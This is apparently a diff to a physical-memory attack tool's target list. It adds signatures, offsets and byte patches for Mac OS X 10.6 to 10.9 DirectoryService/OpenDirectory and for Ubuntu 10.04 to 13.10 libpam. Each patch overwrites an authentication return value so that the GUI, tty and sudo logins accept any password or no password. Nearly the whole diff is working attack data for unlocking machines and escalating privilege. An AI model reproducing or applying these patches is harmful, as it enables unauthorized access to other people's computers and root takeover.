@@ -265,6 +265,230 @@ Target(
                 ]
             )
         ]
+    ),
+Target(
+    name='Mac OS X DirectoryService/OpenDirectory unlock/privilege escalation',
+    note='Overwrites the DoShadowHashAuth/ODRecordVerifyPassword return '
+    'value. After running, all local authentications (e.g., GUI, sudo, etc.) '
+    'will work with all non-blank passwords',
+    signatures=[
+        Signature(
+            os='Mac OS X',
+            os_versions=['10.6.4'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x7cf],
+            chunks=[
+                Chunk(
+                    chunk=0x41bff6c8ffff48c78588,
+                    chunkoffset=0x00,
+                    patch=0x41bf0000000048c78588,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Mac OS X',
+            os_versions=['10.6.8'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0xbff],
+            chunks=[
+                Chunk(
+                    chunk=0x41bff6c8ffff,
+                    chunkoffset=0x00,
+                    patch=0x41bf00000000,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Mac OS X',
+            os_versions=['10.6.8'],
+            os_architectures=['x86'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x82f],
+            chunks=[
+                Chunk(
+                    chunk=0xc78580f6fffff6c8ffff,
+                    chunkoffset=0x00,
+                    patch=0xc78580f6ffff00000000,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Mac OS X',
+            os_versions=['10.7.3'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0xfa7],
+            chunks=[
+                Chunk(
+                    chunk=0x0fb6,
+                    chunkoffset=0x00,
+                    patch=0x31dbffc3, # xor ebx,ebx; inc ebx;
+                    patchoffset=0x00),
+                Chunk(
+                    chunk=0x89d8eb0231c04883c4785b415c415d415e415f5dc3,
+                    chunkoffset=0x0e,
+                    patch=None,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Mac OS X',
+            os_versions=['10.8.2', '10.8.3', '10.8.4'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x334],
+            chunks=[
+                Chunk(
+                    chunk=0x88d84883c4685b415c415d415e415f5d,
+                    chunkoffset=0x00,
+                    patch=0xb001, # mov al,1;
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Mac OS X',
+            os_versions=['10.9'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x1e5],
+            chunks=[
+                Chunk(
+                    chunk=0x4488e84883c4685b415c415d415e415f5d,
+                    chunkoffset=0x00,
+                    patch=0x90b001, # nop; mov al,1;
+                    patchoffset=0x00)
+                ]
+            )
+        ]
+    ),
+Target(
+    name='Ubuntu libpam unlock/privilege escalation',
+    note='Overwrites the pam_authenticate return value. After running, all '
+    'PAM-based authentications (e.g., GUI, tty and sudo) will work with no '
+    'password.',
+    signatures=[
+        Signature(
+            os='Ubuntu',
+            os_versions=['10.10', '10.04', '11.10', '11.04', '12.04'],
+            os_architectures=['x86'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0xa6d, 0xebd, 0x9ed, 0xbaf, 0xa7f],
+            chunks=[
+                Chunk(
+                    chunk=0x83f81f89c774,
+                    chunkoffset=0x00,
+                    patch=0xbf00000000eb,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Ubuntu',
+            os_versions=['12.10', '13.04', '13.10'],
+            os_architectures=['x86'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0xb46, 0xcae, 0xc95],
+            chunks=[
+                Chunk(
+                    chunk=0xe8,
+                    chunkoffset=0x00,
+                    patch=None,
+                    patchoffset=0x00),
+                Chunk(
+                    chunk=0x83f81f,
+                    chunkoffset=0x05,
+                    patch=0x9031c0, # nop; xor eax,eax
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Ubuntu',
+            os_versions=['11.10', '11.04', '12.04'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x838, 0x5b8, 0x3c8],
+            chunks=[
+                Chunk(
+                    chunk=0x83f81f89c574,
+                    chunkoffset=0x00,
+                    patch=0xbd00000000eb,
+                    patchoffset=0x00)
+                ]
+            ),
+        Signature(
+            os='Ubuntu',
+            os_versions=['12.10', '13.04', '13.10'],
+            os_architectures=['x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[0x4aa, 0x69b, 0x688],
+            chunks=[
+                Chunk(
+                    chunk=0xe8,
+                    chunkoffset=0x00,
+                    patch=None,
+                    patchoffset=0x00),
+                Chunk(
+                    chunk=0x83f81f,
+                    chunkoffset=0x05,
+                    patch=0x6631c0, # xor eax,eax
+                    patchoffset=0x00)
+                ]
+            )
+        ]
+    ),
+Target(
+    name=None,
+    note=None,
+    signatures=[
+        Signature(
+            os=None,
+            os_versions=[],
+            os_architectures=['x86', 'x64'],
+            executable=None,
+            version=None,
+            md5=None,
+            tag=False,
+            offsets=[],
+            chunks=[
+                Chunk(
+                    chunk=None,
+                    chunkoffset=0x00,
+                    patch=None,
+                    patchoffset=0x00)
+                ]
+            )
+        ]
     )
 ]
 
